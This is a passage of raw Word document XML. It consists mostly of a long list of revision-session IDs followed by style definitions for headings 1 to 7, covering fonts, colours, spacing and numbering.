    <w:rsid w:val="00124F3F"/>
    <w:rsid w:val="00125592"/>
    <w:rsid w:val="0013284F"/>
    <w:rsid w:val="00132E2C"/>
    <w:rsid w:val="00135179"/>
    <w:rsid w:val="00142F18"/>
    <w:rsid w:val="00147201"/>
    <w:rsid w:val="001519D4"/>
    <w:rsid w:val="00153D6F"/>
    <w:rsid w:val="00160066"/>
    <w:rsid w:val="00161CBC"/>
    <w:rsid w:val="0016752C"/>
    <w:rsid w:val="001714C2"/>
    <w:rsid w:val="00175FA4"/>
    <w:rsid w:val="00182B85"/>
    <w:rsid w:val="00183601"/>
    <w:rsid w:val="001842F9"/>
    <w:rsid w:val="00184BC3"/>
    <w:rsid w:val="00185E80"/>
    <w:rsid w:val="001936A9"/>
    <w:rsid w:val="00195097"/>
    <w:rsid w:val="001A2561"/>
    <w:rsid w:val="001A4ACB"/>
    <w:rsid w:val="001A70C3"/>
    <w:rsid w:val="001B46BD"/>
    <w:rsid w:val="001B478B"/>
    <w:rsid w:val="001B7B6B"/>
    <w:rsid w:val="001D077F"/>
    <w:rsid w:val="001D0880"/>
    <w:rsid w:val="001D0EBC"/>
    <w:rsid w:val="001D4438"/>
    <w:rsid w:val="001E0CB7"/>
    <w:rsid w:val="001E7920"/>
    <w:rsid w:val="001E7AD6"/>
    <w:rsid w:val="001F4FF6"/>
    <w:rsid w:val="0020345B"/>
    <w:rsid w:val="00210486"/>
    <w:rsid w:val="0023094A"/>
    <w:rsid w:val="00232665"/>
    <w:rsid w:val="00235F00"/>
    <w:rsid w:val="002373D6"/>
    <w:rsid w:val="002403EA"/>
    <w:rsid w:val="00240E0A"/>
    <w:rsid w:val="00241710"/>
    <w:rsid w:val="00241770"/>
    <w:rsid w:val="00252325"/>
    <w:rsid w:val="00256A1D"/>
    <w:rsid w:val="0026730F"/>
    <w:rsid w:val="002722C2"/>
    <w:rsid w:val="00275790"/>
    <w:rsid w:val="00276CF1"/>
    <w:rsid w:val="00286CF7"/>
    <w:rsid w:val="00287A72"/>
    <w:rsid w:val="00292498"/>
    <w:rsid w:val="00293388"/>
    <w:rsid w:val="00297D4B"/>
    <w:rsid w:val="002A3C28"/>
    <w:rsid w:val="002A3CBA"/>
    <w:rsid w:val="002A496B"/>
    <w:rsid w:val="002A4A00"/>
    <w:rsid w:val="002B3F06"/>
    <w:rsid w:val="002B4B23"/>
    <w:rsid w:val="002C560F"/>
    <w:rsid w:val="002C63A6"/>
    <w:rsid w:val="002C6D62"/>
    <w:rsid w:val="002D5B04"/>
    <w:rsid w:val="002E27C1"/>
    <w:rsid w:val="002E69EF"/>
    <w:rsid w:val="002E6F52"/>
    <w:rsid w:val="002F00EC"/>
    <w:rsid w:val="002F012E"/>
    <w:rsid w:val="002F2CA3"/>
    <w:rsid w:val="002F37BF"/>
    <w:rsid w:val="003018B9"/>
    <w:rsid w:val="003021FB"/>
    <w:rsid w:val="00302410"/>
    <w:rsid w:val="00304E80"/>
    <w:rsid w:val="003109FE"/>
    <w:rsid w:val="00311078"/>
    <w:rsid w:val="003130D9"/>
    <w:rsid w:val="00314131"/>
    <w:rsid w:val="00320D1F"/>
    <w:rsid w:val="00330EEA"/>
    <w:rsid w:val="0033104D"/>
    <w:rsid w:val="00332D0A"/>
    <w:rsid w:val="00341D36"/>
    <w:rsid w:val="00342013"/>
    <w:rsid w:val="0034651C"/>
    <w:rsid w:val="0034679D"/>
    <w:rsid w:val="003555DB"/>
    <w:rsid w:val="003642A9"/>
    <w:rsid w:val="00370053"/>
    <w:rsid w:val="00370569"/>
    <w:rsid w:val="003705A2"/>
    <w:rsid w:val="003739E9"/>
    <w:rsid w:val="003745AC"/>
    <w:rsid w:val="003764DF"/>
    <w:rsid w:val="00380E7D"/>
    <w:rsid w:val="00382055"/>
    <w:rsid w:val="00382D36"/>
    <w:rsid w:val="00385855"/>
    <w:rsid w:val="00386DFA"/>
    <w:rsid w:val="0038761B"/>
    <w:rsid w:val="00391D58"/>
    <w:rsid w:val="00396CBF"/>
    <w:rsid w:val="003A0CB4"/>
    <w:rsid w:val="003B3165"/>
    <w:rsid w:val="003C11D9"/>
    <w:rsid w:val="003C3F1D"/>
    <w:rsid w:val="003C5514"/>
    <w:rsid w:val="003C6A8C"/>
    <w:rsid w:val="003D0614"/>
    <w:rsid w:val="003D2F37"/>
    <w:rsid w:val="003D3023"/>
    <w:rsid w:val="003D5481"/>
    <w:rsid w:val="003D6068"/>
    <w:rsid w:val="003D7020"/>
    <w:rsid w:val="003D7792"/>
    <w:rsid w:val="003D7835"/>
    <w:rsid w:val="003E2143"/>
    <w:rsid w:val="00402F1D"/>
    <w:rsid w:val="00403FE6"/>
    <w:rsid w:val="0040575B"/>
    <w:rsid w:val="00416DF6"/>
    <w:rsid w:val="00420FDF"/>
    <w:rsid w:val="00434086"/>
    <w:rsid w:val="00435112"/>
    <w:rsid w:val="00435631"/>
    <w:rsid w:val="0044656B"/>
    <w:rsid w:val="00452711"/>
    <w:rsid w:val="0045347D"/>
    <w:rsid w:val="004542DE"/>
    <w:rsid w:val="004570B6"/>
    <w:rsid w:val="00460E7D"/>
    <w:rsid w:val="00464305"/>
    <w:rsid w:val="00466E75"/>
    <w:rsid w:val="00467439"/>
    <w:rsid w:val="004708D5"/>
    <w:rsid w:val="00471BCC"/>
    <w:rsid w:val="004763A0"/>
    <w:rsid w:val="0048360F"/>
    <w:rsid w:val="004849AF"/>
    <w:rsid w:val="00485D1E"/>
    <w:rsid w:val="004934A9"/>
    <w:rsid w:val="004A33AF"/>
    <w:rsid w:val="004A3814"/>
    <w:rsid w:val="004A4955"/>
    <w:rsid w:val="004A52C0"/>
    <w:rsid w:val="004A6CD8"/>
    <w:rsid w:val="004B3360"/>
    <w:rsid w:val="004B4718"/>
    <w:rsid w:val="004B4AA4"/>
    <w:rsid w:val="004C01A4"/>
    <w:rsid w:val="004C15A3"/>
    <w:rsid w:val="004C2F61"/>
    <w:rsid w:val="004C3BB6"/>
    <w:rsid w:val="004C4144"/>
    <w:rsid w:val="004C6A9D"/>
    <w:rsid w:val="004C7129"/>
    <w:rsid w:val="004D4762"/>
    <w:rsid w:val="004E0EC1"/>
    <w:rsid w:val="004E332A"/>
    <w:rsid w:val="004F1A31"/>
    <w:rsid w:val="00501578"/>
    <w:rsid w:val="005023CA"/>
    <w:rsid w:val="00516D50"/>
    <w:rsid w:val="005172BE"/>
    <w:rsid w:val="00530236"/>
    <w:rsid w:val="00540FEE"/>
    <w:rsid w:val="00541704"/>
    <w:rsid w:val="0054300B"/>
    <w:rsid w:val="00544242"/>
    <w:rsid w:val="005447E7"/>
    <w:rsid w:val="00545D93"/>
    <w:rsid w:val="0055186D"/>
    <w:rsid w:val="00552884"/>
    <w:rsid w:val="00560B06"/>
    <w:rsid w:val="00564D0B"/>
    <w:rsid w:val="0056654A"/>
    <w:rsid w:val="00571B1A"/>
    <w:rsid w:val="005731BB"/>
    <w:rsid w:val="00574055"/>
    <w:rsid w:val="00581E4E"/>
    <w:rsid w:val="00582B21"/>
    <w:rsid w:val="005836A4"/>
    <w:rsid w:val="00592B9C"/>
    <w:rsid w:val="00595424"/>
    <w:rsid w:val="005A01BD"/>
    <w:rsid w:val="005A3AF0"/>
    <w:rsid w:val="005A7A4F"/>
    <w:rsid w:val="005B1A9A"/>
    <w:rsid w:val="005B1D2B"/>
    <w:rsid w:val="005B2AFF"/>
    <w:rsid w:val="005B3031"/>
    <w:rsid w:val="005B4D61"/>
    <w:rsid w:val="005C7750"/>
    <w:rsid w:val="005D0134"/>
    <w:rsid w:val="005E4075"/>
    <w:rsid w:val="005E6039"/>
    <w:rsid w:val="005F1DA9"/>
    <w:rsid w:val="005F2EA8"/>
    <w:rsid w:val="005F70C2"/>
    <w:rsid w:val="0060157D"/>
    <w:rsid w:val="00601E8B"/>
    <w:rsid w:val="00603680"/>
    <w:rsid w:val="00612C44"/>
    <w:rsid w:val="00613369"/>
    <w:rsid w:val="00623B89"/>
    <w:rsid w:val="006277DB"/>
    <w:rsid w:val="00631D8F"/>
    <w:rsid w:val="0063240B"/>
    <w:rsid w:val="00633CD9"/>
    <w:rsid w:val="00637DBA"/>
    <w:rsid w:val="00643C52"/>
    <w:rsid w:val="0065234D"/>
    <w:rsid w:val="00652521"/>
    <w:rsid w:val="00652AAA"/>
    <w:rsid w:val="006549E7"/>
    <w:rsid w:val="0065586C"/>
    <w:rsid w:val="0066212C"/>
    <w:rsid w:val="00664950"/>
    <w:rsid w:val="006774C7"/>
    <w:rsid w:val="00683368"/>
    <w:rsid w:val="00685118"/>
    <w:rsid w:val="006872C0"/>
    <w:rsid w:val="006A0864"/>
    <w:rsid w:val="006A4579"/>
    <w:rsid w:val="006A4629"/>
    <w:rsid w:val="006B49A3"/>
    <w:rsid w:val="006B7AEF"/>
    <w:rsid w:val="006C0288"/>
    <w:rsid w:val="006C267B"/>
    <w:rsid w:val="006D010A"/>
    <w:rsid w:val="006D2A39"/>
    <w:rsid w:val="006E0F31"/>
    <w:rsid w:val="006E1A83"/>
    <w:rsid w:val="00700CBB"/>
    <w:rsid w:val="00702185"/>
    <w:rsid w:val="0070452B"/>
    <w:rsid w:val="00715F37"/>
    <w:rsid w:val="00715FD3"/>
    <w:rsid w:val="00720C8D"/>
    <w:rsid w:val="00724E32"/>
    <w:rsid w:val="00727F43"/>
    <w:rsid w:val="007301C1"/>
    <w:rsid w:val="0073032E"/>
    <w:rsid w:val="007309B0"/>
    <w:rsid w:val="00735F4B"/>
    <w:rsid w:val="007366DB"/>
    <w:rsid w:val="00742B00"/>
    <w:rsid w:val="0074594D"/>
    <w:rsid w:val="007459FC"/>
    <w:rsid w:val="007465F2"/>
    <w:rsid w:val="00757DE9"/>
    <w:rsid w:val="0076133F"/>
    <w:rsid w:val="00767DC9"/>
    <w:rsid w:val="00775C67"/>
    <w:rsid w:val="00777B6B"/>
    <w:rsid w:val="00782973"/>
    <w:rsid w:val="00790E30"/>
    <w:rsid w:val="00793027"/>
    <w:rsid w:val="007964DF"/>
    <w:rsid w:val="00797EF1"/>
    <w:rsid w:val="007B2775"/>
    <w:rsid w:val="007B4A5B"/>
    <w:rsid w:val="007B782F"/>
    <w:rsid w:val="007C149D"/>
    <w:rsid w:val="007C293D"/>
    <w:rsid w:val="007C5A3A"/>
    <w:rsid w:val="007D1252"/>
    <w:rsid w:val="007D3301"/>
    <w:rsid w:val="007D6FCA"/>
    <w:rsid w:val="007D76CB"/>
    <w:rsid w:val="007D7839"/>
    <w:rsid w:val="007E0AFB"/>
    <w:rsid w:val="007E65FA"/>
    <w:rsid w:val="007E671D"/>
    <w:rsid w:val="007E6CEE"/>
    <w:rsid w:val="007F0958"/>
    <w:rsid w:val="007F527A"/>
    <w:rsid w:val="00801131"/>
    <w:rsid w:val="008061EC"/>
    <w:rsid w:val="008062C5"/>
    <w:rsid w:val="0080655E"/>
    <w:rsid w:val="00813145"/>
    <w:rsid w:val="00814A26"/>
    <w:rsid w:val="00815CEA"/>
    <w:rsid w:val="0082091F"/>
    <w:rsid w:val="00821669"/>
    <w:rsid w:val="00824BA7"/>
    <w:rsid w:val="00833180"/>
    <w:rsid w:val="00834F4A"/>
    <w:rsid w:val="008428F7"/>
    <w:rsid w:val="0084413C"/>
    <w:rsid w:val="0084456B"/>
    <w:rsid w:val="00857C74"/>
    <w:rsid w:val="00857F72"/>
    <w:rsid w:val="008639B6"/>
    <w:rsid w:val="00864C0C"/>
    <w:rsid w:val="00865239"/>
    <w:rsid w:val="008663C5"/>
    <w:rsid w:val="0087281C"/>
    <w:rsid w:val="008752DE"/>
    <w:rsid w:val="00882AC5"/>
    <w:rsid w:val="00884613"/>
    <w:rsid w:val="00885CB5"/>
    <w:rsid w:val="008923C6"/>
    <w:rsid w:val="00892C27"/>
    <w:rsid w:val="00895122"/>
    <w:rsid w:val="008A0C8D"/>
    <w:rsid w:val="008A317E"/>
    <w:rsid w:val="008B278E"/>
    <w:rsid w:val="008B32AA"/>
    <w:rsid w:val="008B4B77"/>
    <w:rsid w:val="008B7655"/>
    <w:rsid w:val="008C3C31"/>
    <w:rsid w:val="008C429F"/>
    <w:rsid w:val="008C6F80"/>
    <w:rsid w:val="008D3C31"/>
    <w:rsid w:val="008E3455"/>
    <w:rsid w:val="008E7364"/>
    <w:rsid w:val="008F7D86"/>
    <w:rsid w:val="00902F3F"/>
    <w:rsid w:val="00914C21"/>
    <w:rsid w:val="0092049B"/>
    <w:rsid w:val="00921C57"/>
    <w:rsid w:val="00933ACF"/>
    <w:rsid w:val="00946247"/>
    <w:rsid w:val="009479A3"/>
    <w:rsid w:val="0095149E"/>
    <w:rsid w:val="00952B84"/>
    <w:rsid w:val="009559E1"/>
    <w:rsid w:val="009567A8"/>
    <w:rsid w:val="00956FFE"/>
    <w:rsid w:val="00957DB0"/>
    <w:rsid w:val="00967794"/>
    <w:rsid w:val="00967BDA"/>
    <w:rsid w:val="0097539B"/>
    <w:rsid w:val="00980E31"/>
    <w:rsid w:val="00982C68"/>
    <w:rsid w:val="00983989"/>
    <w:rsid w:val="00991B85"/>
    <w:rsid w:val="00992B14"/>
    <w:rsid w:val="009973FE"/>
    <w:rsid w:val="009A0EEF"/>
    <w:rsid w:val="009A2B60"/>
    <w:rsid w:val="009A4B11"/>
    <w:rsid w:val="009A578C"/>
    <w:rsid w:val="009B24B2"/>
    <w:rsid w:val="009B35AA"/>
    <w:rsid w:val="009B3883"/>
    <w:rsid w:val="009B3984"/>
    <w:rsid w:val="009B6CAE"/>
    <w:rsid w:val="009C00A6"/>
    <w:rsid w:val="009C40EC"/>
    <w:rsid w:val="009C452C"/>
    <w:rsid w:val="009C5ACD"/>
    <w:rsid w:val="009D0403"/>
    <w:rsid w:val="009D45D3"/>
    <w:rsid w:val="009D5CA3"/>
    <w:rsid w:val="009E0E17"/>
    <w:rsid w:val="009E5AD4"/>
    <w:rsid w:val="009F169A"/>
    <w:rsid w:val="009F1E53"/>
    <w:rsid w:val="00A00853"/>
    <w:rsid w:val="00A03010"/>
    <w:rsid w:val="00A035A3"/>
    <w:rsid w:val="00A06A80"/>
    <w:rsid w:val="00A11B83"/>
    <w:rsid w:val="00A338E0"/>
    <w:rsid w:val="00A34250"/>
    <w:rsid w:val="00A4216F"/>
    <w:rsid w:val="00A42813"/>
    <w:rsid w:val="00A45B14"/>
    <w:rsid w:val="00A45C4C"/>
    <w:rsid w:val="00A5304C"/>
    <w:rsid w:val="00A5440B"/>
    <w:rsid w:val="00A54716"/>
    <w:rsid w:val="00A62160"/>
    <w:rsid w:val="00A75091"/>
    <w:rsid w:val="00AA3610"/>
    <w:rsid w:val="00AA4403"/>
    <w:rsid w:val="00AA7433"/>
    <w:rsid w:val="00AC2D48"/>
    <w:rsid w:val="00AC305B"/>
    <w:rsid w:val="00AD331D"/>
    <w:rsid w:val="00AD695A"/>
    <w:rsid w:val="00AE1AA2"/>
    <w:rsid w:val="00AE2C2D"/>
    <w:rsid w:val="00AF5C16"/>
    <w:rsid w:val="00AF719E"/>
    <w:rsid w:val="00B06AC6"/>
    <w:rsid w:val="00B11CAF"/>
    <w:rsid w:val="00B1535D"/>
    <w:rsid w:val="00B16B87"/>
    <w:rsid w:val="00B2225D"/>
    <w:rsid w:val="00B31F06"/>
    <w:rsid w:val="00B341CC"/>
    <w:rsid w:val="00B43077"/>
    <w:rsid w:val="00B511B5"/>
    <w:rsid w:val="00B6130C"/>
    <w:rsid w:val="00B635E7"/>
    <w:rsid w:val="00B64DEC"/>
    <w:rsid w:val="00B83160"/>
    <w:rsid w:val="00B92BE3"/>
    <w:rsid w:val="00B93262"/>
    <w:rsid w:val="00B939DB"/>
    <w:rsid w:val="00BA7765"/>
    <w:rsid w:val="00BB1A97"/>
    <w:rsid w:val="00BC18E3"/>
    <w:rsid w:val="00BC3B60"/>
    <w:rsid w:val="00BC49E2"/>
    <w:rsid w:val="00BC6DEC"/>
    <w:rsid w:val="00BD23B6"/>
    <w:rsid w:val="00BD3274"/>
    <w:rsid w:val="00BE0AEC"/>
    <w:rsid w:val="00BE5596"/>
    <w:rsid w:val="00BE56BF"/>
    <w:rsid w:val="00BF1D7C"/>
    <w:rsid w:val="00BF35BD"/>
    <w:rsid w:val="00BF4F8A"/>
    <w:rsid w:val="00BF6B00"/>
    <w:rsid w:val="00C00E30"/>
    <w:rsid w:val="00C01E2A"/>
    <w:rsid w:val="00C041F5"/>
    <w:rsid w:val="00C141B9"/>
    <w:rsid w:val="00C14F25"/>
    <w:rsid w:val="00C1550B"/>
    <w:rsid w:val="00C162E0"/>
    <w:rsid w:val="00C20D28"/>
    <w:rsid w:val="00C22A0F"/>
    <w:rsid w:val="00C30F74"/>
    <w:rsid w:val="00C451E1"/>
    <w:rsid w:val="00C50325"/>
    <w:rsid w:val="00C50398"/>
    <w:rsid w:val="00C53F81"/>
    <w:rsid w:val="00C5458B"/>
    <w:rsid w:val="00C54FC7"/>
    <w:rsid w:val="00C550AD"/>
    <w:rsid w:val="00C564FF"/>
    <w:rsid w:val="00C6266A"/>
    <w:rsid w:val="00C62F9F"/>
    <w:rsid w:val="00C64C26"/>
    <w:rsid w:val="00C65C94"/>
    <w:rsid w:val="00C674E3"/>
    <w:rsid w:val="00C700CC"/>
    <w:rsid w:val="00C71150"/>
    <w:rsid w:val="00C719DC"/>
    <w:rsid w:val="00C742A0"/>
    <w:rsid w:val="00C7482D"/>
    <w:rsid w:val="00C752FF"/>
    <w:rsid w:val="00C754C9"/>
    <w:rsid w:val="00C754FE"/>
    <w:rsid w:val="00C76673"/>
    <w:rsid w:val="00C831DA"/>
    <w:rsid w:val="00C843E9"/>
    <w:rsid w:val="00C85267"/>
    <w:rsid w:val="00C91D27"/>
    <w:rsid w:val="00C93FCA"/>
    <w:rsid w:val="00CA2CB4"/>
    <w:rsid w:val="00CA67EE"/>
    <w:rsid w:val="00CB4C11"/>
    <w:rsid w:val="00CC06D4"/>
    <w:rsid w:val="00CC516E"/>
    <w:rsid w:val="00CD0C1D"/>
    <w:rsid w:val="00CD35A7"/>
    <w:rsid w:val="00CD6B3D"/>
    <w:rsid w:val="00CE3DC6"/>
    <w:rsid w:val="00CE5451"/>
    <w:rsid w:val="00CE55B4"/>
    <w:rsid w:val="00CE603A"/>
    <w:rsid w:val="00CE6046"/>
    <w:rsid w:val="00CE75EF"/>
    <w:rsid w:val="00CF071F"/>
    <w:rsid w:val="00D01773"/>
    <w:rsid w:val="00D0267D"/>
    <w:rsid w:val="00D02F1C"/>
    <w:rsid w:val="00D05638"/>
    <w:rsid w:val="00D10376"/>
    <w:rsid w:val="00D139F0"/>
    <w:rsid w:val="00D13B6B"/>
    <w:rsid w:val="00D14C28"/>
    <w:rsid w:val="00D150C5"/>
    <w:rsid w:val="00D152A4"/>
    <w:rsid w:val="00D16776"/>
    <w:rsid w:val="00D22986"/>
    <w:rsid w:val="00D230EC"/>
    <w:rsid w:val="00D266ED"/>
    <w:rsid w:val="00D26C50"/>
    <w:rsid w:val="00D30CB4"/>
    <w:rsid w:val="00D41F6C"/>
    <w:rsid w:val="00D513A0"/>
    <w:rsid w:val="00D51B17"/>
    <w:rsid w:val="00D56EF7"/>
    <w:rsid w:val="00D60A79"/>
    <w:rsid w:val="00D649D9"/>
    <w:rsid w:val="00D8125E"/>
    <w:rsid w:val="00D8264B"/>
    <w:rsid w:val="00D92E25"/>
    <w:rsid w:val="00D935B7"/>
    <w:rsid w:val="00DA4C9B"/>
    <w:rsid w:val="00DB110E"/>
    <w:rsid w:val="00DB27DA"/>
    <w:rsid w:val="00DB42A0"/>
    <w:rsid w:val="00DB7D96"/>
    <w:rsid w:val="00DC20D2"/>
    <w:rsid w:val="00DC3DFB"/>
    <w:rsid w:val="00DD0B4D"/>
    <w:rsid w:val="00DD14BD"/>
    <w:rsid w:val="00DE3648"/>
    <w:rsid w:val="00DE7588"/>
    <w:rsid w:val="00DE7F4B"/>
    <w:rsid w:val="00DF7459"/>
    <w:rsid w:val="00E00B28"/>
    <w:rsid w:val="00E040C9"/>
    <w:rsid w:val="00E050E1"/>
    <w:rsid w:val="00E07DA5"/>
    <w:rsid w:val="00E15187"/>
    <w:rsid w:val="00E20B02"/>
    <w:rsid w:val="00E247AF"/>
    <w:rsid w:val="00E25F7D"/>
    <w:rsid w:val="00E274EC"/>
    <w:rsid w:val="00E310A8"/>
    <w:rsid w:val="00E462CC"/>
    <w:rsid w:val="00E50869"/>
    <w:rsid w:val="00E52C85"/>
    <w:rsid w:val="00E6370C"/>
    <w:rsid w:val="00E728A4"/>
    <w:rsid w:val="00E738CC"/>
    <w:rsid w:val="00E75668"/>
    <w:rsid w:val="00E777B9"/>
    <w:rsid w:val="00E8168D"/>
    <w:rsid w:val="00E823CF"/>
    <w:rsid w:val="00E85550"/>
    <w:rsid w:val="00E917C4"/>
    <w:rsid w:val="00E95A73"/>
    <w:rsid w:val="00E97074"/>
    <w:rsid w:val="00EA1776"/>
    <w:rsid w:val="00EA2472"/>
    <w:rsid w:val="00EA293F"/>
    <w:rsid w:val="00EA51EB"/>
    <w:rsid w:val="00EA58A4"/>
    <w:rsid w:val="00EA59A4"/>
    <w:rsid w:val="00EA7AF6"/>
    <w:rsid w:val="00EB2670"/>
    <w:rsid w:val="00EC129C"/>
    <w:rsid w:val="00EC1981"/>
    <w:rsid w:val="00EC59BF"/>
    <w:rsid w:val="00EC792B"/>
    <w:rsid w:val="00ED4CF5"/>
    <w:rsid w:val="00ED5DA4"/>
    <w:rsid w:val="00EE00CB"/>
    <w:rsid w:val="00EE13BD"/>
    <w:rsid w:val="00EE3793"/>
    <w:rsid w:val="00EE6A05"/>
    <w:rsid w:val="00EE6A93"/>
    <w:rsid w:val="00EF1BDB"/>
    <w:rsid w:val="00F0396F"/>
    <w:rsid w:val="00F10F9E"/>
    <w:rsid w:val="00F1171B"/>
    <w:rsid w:val="00F27D73"/>
    <w:rsid w:val="00F31306"/>
    <w:rsid w:val="00F3295C"/>
    <w:rsid w:val="00F33E56"/>
    <w:rsid w:val="00F444A0"/>
    <w:rsid w:val="00F5436A"/>
    <w:rsid w:val="00F54EBD"/>
    <w:rsid w:val="00F56085"/>
    <w:rsid w:val="00F56851"/>
    <w:rsid w:val="00F5758D"/>
    <w:rsid w:val="00F6016D"/>
    <w:rsid w:val="00F629F5"/>
    <w:rsid w:val="00F66CA2"/>
    <w:rsid w:val="00F70CFC"/>
    <w:rsid w:val="00F71AEC"/>
    <w:rsid w:val="00F74E35"/>
    <w:rsid w:val="00F74E55"/>
    <w:rsid w:val="00F77AAA"/>
    <w:rsid w:val="00F82CFA"/>
    <w:rsid w:val="00F84232"/>
    <w:rsid w:val="00F87067"/>
    <w:rsid w:val="00F90BF7"/>
    <w:rsid w:val="00F96022"/>
    <w:rsid w:val="00F97999"/>
    <w:rsid w:val="00FA0878"/>
    <w:rsid w:val="00FA7FF1"/>
    <w:rsid w:val="00FB0034"/>
    <w:rsid w:val="00FB1EA0"/>
    <w:rsid w:val="00FB709A"/>
    <w:rsid w:val="00FC17E9"/>
    <w:rsid w:val="00FC2C75"/>
    <w:rsid w:val="00FC74B6"/>
    <w:rsid w:val="00FD1909"/>
    <w:rsid w:val="00FD5CB6"/>
    <w:rsid w:val="00FE79DB"/>
    <w:rsid w:val="00FF448D"/>
    <w:rsid w:val="00FF74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2245B3"/>
  <w15:docId w15:val="{36711078-5AE1-429E-BADB-C58F9A7E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qFormat="1"/>
    <w:lsdException w:name="heading 3" w:semiHidden="1" w:uiPriority="3" w:qFormat="1"/>
    <w:lsdException w:name="heading 4" w:semiHidden="1" w:uiPriority="2" w:unhideWhenUsed="1"/>
    <w:lsdException w:name="heading 5" w:semiHidden="1" w:uiPriority="9"/>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qFormat="1"/>
    <w:lsdException w:name="List Number" w:semiHidden="1" w:uiPriority="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qFormat="1"/>
    <w:lsdException w:name="List Bullet 3" w:semiHidden="1" w:uiPriority="6"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38761B"/>
    <w:pPr>
      <w:spacing w:after="0" w:line="270" w:lineRule="atLeast"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:ascii="Lucida Sans Unicode" w:hAnsi="Lucida Sans Unicode" w:cs="Arial"/>
      <w:sz w:val="20"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading1">
    <w:name w:val="heading 1"/>
    <w:next w:val="BodyText"/>
    <w:link w:val="Heading1Char"/>
    <w:uiPriority w:val="1"/>
    <w:qFormat/>
    <w:rsid w:val="00434086"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="520" w:after="520" w:line="240" w:lineRule="auto"/>
      <w:outlineLvl w:val="0"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="34"/>
      <w:szCs w:val="28"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading2">
    <w:name w:val="heading 2"/>
    <w:next w:val="BodyText"/>
    <w:link w:val="Heading2Char"/>
    <w:uiPriority w:val="2"/>
    <w:qFormat/>
    <w:rsid w:val="00434086"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="1"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="270" w:after="270"/>
      <w:outlineLvl w:val="1"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:color w:val="D94D22" w:themeColor="accent2"/>
      <w:sz w:val="30"/>
      <w:szCs w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading3">
    <w:name w:val="heading 3"/>
    <w:next w:val="BodyText"/>
    <w:link w:val="Heading3Char"/>
    <w:uiPriority w:val="3"/>
    <w:qFormat/>
    <w:rsid w:val="00434086"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="2"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="270" w:after="270"/>
      <w:outlineLvl w:val="2"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:bCs/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
      <w:sz w:val="26"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading4">
    <w:name w:val="heading 4"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="BodyText"/>
    <w:link w:val="Heading4Char"/>
    <w:uiPriority w:val="2"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:numPr>
        <w:ilvl w:val="3"/>
        <w:numId w:val="2"/>
      </w:numPr>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="3"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:eastAsiaTheme="majorEastAsia" w:cstheme="majorBidi"/>
      <w:b/>
      <w:bCs/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="1E5272" w:themeColor="text1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading5">
    <w:name w:val="heading 5"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading5Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="4"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading6">
    <w:name w:val="heading 6"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading6Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="5"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="68727B" w:themeColor="accent1"/>
    </w:rPr>
  </w:style>
  <w:style w:type="paragraph" w:styleId="Heading7">
    <w:name w:val="heading 7"/>
    <w:basedOn w:val="Normal"/>
    <w:next w:val="Normal"/>
    <w:link w:val="Heading7Char"/>
    <w:uiPriority w:val="9"/>
    <w:semiHidden/>
    <w:qFormat/>
    <w:rsid w:val="006E0F31"/>
    <w:pPr>
      <w:keepNext/>
      <w:keepLines/>
      <w:spacing w:before="200"/>
      <w:outlineLvl w:val="6"/>
    </w:pPr>
    <w:rPr>
      <w:rFonts w:asciiTheme="majorHAnsi" w:eastAsiaTheme="majorEastAsia" w:hAnsiTheme="majorHAnsi" w:cstheme="majorBidi"/>
      <w:i/>
      <w:iCs/>
      <w:color w:val="3185BA" w:themeColor="text1" w:themeTint="BF"/>
    </w:rPr>
